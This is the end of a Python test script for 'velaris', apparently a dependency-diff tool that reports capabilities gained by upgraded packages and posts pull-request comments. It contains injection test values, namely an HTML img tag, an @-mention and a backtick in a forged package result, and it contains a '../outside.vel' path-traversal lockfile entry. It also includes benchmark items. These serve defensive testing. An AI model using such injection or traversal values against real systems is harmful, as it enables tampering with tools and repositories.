               "npm:textkit" in body and "postinstall" in body
               and "unknown" in body and "yarn.lock" in body
               and "not safe" in body, body[:900])
            GitHub.calls[:] = []
            quiet = velaris_cli("deps-diff", "--against", "HEAD", "--comment",
                                "--pr", "7", cwd=repo, env=env)
            ok("...and when no lockfile changes any more, the same comment "
               "says so",
               quiet.returncode == 0 and [c[0] for c in GitHub.calls
                                          if c[0] != "GET"] == ["PATCH"]
               and "any more" in ours[0]["body"], GitHub.calls)
            GitHub.comments[:] = []
            GitHub.calls[:] = []
            velaris_cli("deps-diff", "--against", "HEAD", "--comment", "--pr",
                        "7", cwd=repo, env=env)
            ok("...while a pull request that never changed a lockfile gets "
               "no comment at all",
               not any(c[0] == "POST" for c in GitHub.calls)
               and GitHub.comments == [], GitHub.calls)

            registry.shutdown()
            md = velaris_cli("deps-diff", "--from", str(saved), "--markdown",
                             cwd=repo)
            ok("--from renders a saved result with no registry to reach",
               md.returncode == 1 and velaris.DEPS_COMMENT_MARKER in md.stdout
               and "npm:textkit" in md.stdout, md.stderr)

            plain = velaris_cli("deps-diff", "--from", str(saved), cwd=repo)
            ok("...and as text, the form the Action prints to the job log: "
               "each upgrade, its line, what it gained, and what was not "
               "read",
               plain.returncode == 1
               and "npm:textkit 1.0.0 -> 1.1.0 (package-lock.json line"
               in plain.stdout
               and "ADDED    npm postinstall" in plain.stdout
               and "does not read this lockfile's format" in plain.stdout,
               plain.stdout[-900:] + plain.stderr[-400:])

            # the lockfile is the pull request's to write, and the comment
            # is posted with the repository's token
            hostile = json.loads(saved.read_text(encoding="utf-8"))
            first_up = hostile["upgrades"][0]
            first_up["name"] = "evil`name"
            first_up["result"] = None
            first_up["error"] = ("no version <img src=https://example.invalid"
                                 "/x> for @octocat")
            forged = repo / "hostile.json"
            forged.write_text(json.dumps(hostile), encoding="utf-8")
            md = velaris_cli("deps-diff", "--from", str(forged), "--markdown",
                             cwd=repo)
            ok("text a pull request's lockfile controls reaches the comment "
               "with no HTML, no mention, and no way out of its code span",
               "<img" not in md.stdout and "@octocat" not in md.stdout
               and "&lt;img" in md.stdout and "evil'name" in md.stdout,
               md.stdout[:900])

            vendored = git_repo({"lib/mailer.vel": MAILER})
            write(vendored, {"velaris.lock": json.dumps({
                "lockfile": "velaris.lock/1", "libraries": [{
                    "name": "mailer", "file": "lib/mailer.vel",
                    "source": "https://example.com/mailer.vel",
                    "sha256": hashlib.sha256(MAILER.encode()).hexdigest(),
                    "added_by": velaris.VERSION}]}, indent=2) + "\n"})
            commit(vendored, "vendor mailer")
            write(vendored, {"lib/mailer.vel": MAILER_WITH_COPY,
                             "velaris.lock": json.dumps({
                                 "lockfile": "velaris.lock/1", "libraries": [{
                                     "name": "mailer",
                                     "file": "lib/mailer.vel",
                                     "source": "https://example.com/m.vel",
                                     "sha256": hashlib.sha256(
                                         MAILER_WITH_COPY.encode())
                                     .hexdigest(),
                                     "added_by": velaris.VERSION}]},
                                 indent=2) + "\n"})
            done = velaris_cli("deps-diff", "--against", "HEAD", "--json",
                               cwd=vendored)
            r = as_json(done)
            up = (r.get("upgrades") or [{}])[0]
            res = up.get("result") or {}
            ok("a library velaris.lock vendors, replaced: the file at the "
               "base against the file in the tree - the new host reported",
               done.returncode == 1 and up.get("ecosystem") == "velaris"
               and (res.get("velaris") or {}).get("gained", {}).get("hosts")
               == ["collector.example.net"]
               and res.get("capability") == "derived", r)

            write(vendored, {"velaris.lock": json.dumps({
                "lockfile": "velaris.lock/1", "libraries": [{
                    "name": "mailer", "file": "../outside.vel",
                    "source": "https://example.com/m.vel",
                    "sha256": "1" * 64, "added_by": velaris.VERSION}]},
                indent=2) + "\n"})
            done = velaris_cli("deps-diff", "--against", "HEAD", "--json",
                               cwd=vendored)
            r = as_json(done)
            up = (r.get("upgrades") or [{}])[0]
            ok("a velaris.lock entry naming a file outside the repository: "
               "not read, and said, with exit 3",
               done.returncode == 3 and up.get("result") is None
               and "inside the repository" in (up.get("error") or ""), r)

        # --------------------------------------------------------------------
        print()
        print("lockfile formats, read directly")
        print("-" * 62)
        v1 = json.dumps({"lockfileVersion": 1, "dependencies": {
            "left": {"version": "1.2.0",
                     "resolved": "https://registry.npmjs.org/left/-/left-1.2.0"
                                 ".tgz",
                     "dependencies": {"inner": {
                         "version": "0.3.0",
                         "resolved": "https://registry.npmjs.org/inner/-/"
                                     "inner-0.3.0.tgz"}}},
            "forked": {"version": "2.0.0",
                       "resolved": "git+ssh://git@github.com/o/forked.git#ab"},
            "private": {"version": "1.0.0",
                        "resolved": "https://npm.corp.example/private/-/"
                                    "private-1.0.0.tgz"}}}, indent=2)
        got, notes = velaris._parse_lockfile("npm-lock", v1)
        ok("package-lock.json v1: nested entries read; one resolved from git "
           "and one from another registry left out, and said - the public "
           "package of the same name is a different package",
           set(got) == {"left", "inner"}
           and any("forked" in n for n in notes)
           and any("private" in n and "npm.corp.example" in n
                   for n in notes), (got, notes))

        pip = json.dumps({
            "_meta": {"sources": [
                {"name": "pypi", "url": "https://pypi.org/simple"},
                {"name": "corp", "url": "https://pypi.corp.example/simple"}]},
            "default": {
                "Django": {"hashes": ["sha256:aa", "sha256:bb"],
                           "index": "pypi", "version": "==4.2.0"},
                "requests": {"hashes": ["sha256:cc"], "index": "pypi",
                             "version": "==4.2.0"}},
            "develop": {"internal-tool": {"index": "corp",
                                          "version": "==1.0"},
                        "localpkg": {"path": "."}}}, indent=4)
        got, notes = velaris._parse_lockfile("pipfile-lock", pip)
        line = velaris._lock_line(pip, "pipfile-lock", "requests", "4.2.0")
        ok("Pipfile.lock: names normalised; an entry from another index and "
           "one from a path left out; the line found for the right package "
           "when two pin the same version",
           set(got) == {"django", "requests"}
           and line == line_of(pip, '"requests": {', '"version": "==4.2.0"')
           and any("internal-tool" in n for n in notes)
           and any("localpkg" in n for n in notes), (got, notes, line))

        poetry = ('[[package]]\nname = "typing_extensions"\n'
                  'version = "4.8.0"\ndescription = "x"\noptional = false\n\n'
                  '[[package]]\nname = "mylib"\nversion = "0.1.0"\n'
                  'description = "y"\n\n[package.source]\ntype = "git"\n'
                  'url = "https://github.com/o/mylib.git"\n\n'
                  '[metadata]\nlock-version = "2.0"\n')
        got, notes = velaris._parse_lockfile("toml-packages", poetry)
        line = velaris._lock_line(poetry, "toml-packages",
                                  "typing-extensions", "4.8.0")
        ok("poetry.lock: a package from git left out and said; a name "
           "written with an underscore found on its line",
           set(got) == {"typing-extensions"} and line == 3
           and any("mylib" in n for n in notes), (got, notes, line))

        uv = ('version = 1\n\n[[package]]\nname = "app"\nversion = "0.1.0"\n'
              'source = { editable = "." }\n\n[[package]]\nname = "httpx"\n'
              'version = "0.27.0"\n'
              'source = { registry = "https://pypi.org/simple" }\n'
              'dependencies = [\n    { name = "anyio" },\n]\n')
        got, notes = velaris._parse_lockfile("toml-packages", uv)
        ok("uv.lock: the project's own editable entry left out, a package "
           "from PyPI read",
           got == {"httpx": {"0.27.0": "package"}}
           and any("app" in n for n in notes), (got, notes))

        reqs = ("# pinned\n"
                "requests[socks]==2.31.0 ; python_version >= '3.8' \\\n"
                "    --hash=sha256:abc\n"
                "Urllib3===2.0.7  # comment\n"
                "-e git+https://github.com/o/x.git#egg=x\n"
                "flask>=2\n")
        got, notes = velaris._parse_lockfile("requirements", reqs)
        line = velaris._lock_line(reqs, "requirements", "urllib3", "2.0.7")
        fenced, fenced_notes = velaris._parse_lockfile(
            "requirements", "--extra-index-url https://pypi.corp.example/s\n"
                            "requests==2.31.0\n")
        ok("requirements*.txt: pins with extras, markers, hashes and === "
           "read, an editable or unpinned line not; a file that sets another "
           "index not read at all, and said",
           set(got) == {"requests", "urllib3"} and line == 4
           and fenced == {} and fenced_notes, (got, line, fenced_notes))

        ups, adds, rems = velaris._lock_changes(
            {"a": {"1.0.0": 1}, "b": {"2.0.0": 1}, "c": {"1.0": 1}},
            {"a": {"1.1.0": 1}, "b": {"2.0.0": 1, "3.0.0": 1},
             "d": {"0.1": 1}})
        ok("pairing: an upgrade from the version that went; a second version "
           "beside one that stayed, compared with it; one added, one removed",
           ups == [("a", "1.0.0", "1.1.0"), ("b", "2.0.0", "3.0.0")]
           and adds == [("d", "0.1")] and rems == [("c", "1.0")],
           (ups, adds, rems))

        # --------------------------------------------------------------------
        print()
        print("the benchmark's category 12, asserted directly")
        print("-" * 62)
        key, programs = category_12()
        ok("category 12 is three dangerous upgrades and one control",
           [(p["id"], p["dangerous"]) for p in programs]
           == [("12a", True), ("12b", True), ("12c", True),
               ("12d", False)], programs)
        for prog in programs:
            dep = prog["dependency"]
            versions, callers, fills = place_12(key, prog)
            compiles = all(velaris_cli("check", str(callers[side]))
                           .returncode == 0 for side in ("old", "new"))
            code, r, _ = diff(f"dir:{versions}", dep["old"], dep["new"])
            gained = (r.get("velaris") or {}).get("gained", {})
            before = (r.get("velaris") or {}).get("before", {})
            if prog["id"] == "12a":
                g = grant_finding(r, "net:127.0.0.1:50002")
                good = (code == 1 and g.get("new_effect") is True
                        and gained.get("effects") == ["net"]
                        and any(f["kind"] == "function"
                                and f["function"] == "price_line"
                                for f in findings(r)))
                what = ("12a: pricing gains net - a new effect, and the "
                        "function that gained it")
            elif prog["id"] == "12b":
                g = grant_finding(r, "net:127.0.0.1:50002")
                good = (code == 1 and g.get("new_effect") is False
                        and "net:127.0.0.1:50001" in before.get("grants", [])
                        and gained.get("hosts") == ["127.0.0.1:50002"])
                what = ("12b: mailer gains a second host inside the net it "
                        "already had")
            elif prog["id"] == "12c":
                path = fills["{path}"]
                good = (code == 1 and gained.get("paths", {}).get("write")
                        == [path] and gained.get("effects") == []
                        and any(g.startswith("fs:read:")
                                for g in before.get("grants", [])))
                what = ("12c: settings gains fs:write inside the fs it "
                        "already had for a read")
            else:
                good = (code == 0 and r.get("gained") is False
                        and findings(r) == []
                        and r["velaris"]["narrowed"] != [])
                what = "12d: report narrows, and nothing is flagged"
            ok(what + "; the unchanged caller compiles against both versions",
               good and compiles, (compiles, r.get("velaris")))
    finally:
        for server in (registry, github):
            try:
                server.shutdown()
            except Exception:
                pass
        shutil.rmtree(SCRATCH, ignore_errors=True)

    print()
    print(f"{passed} correct, {failed} wrong"
          + (f", {skipped} skipped" if skipped else ""))
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
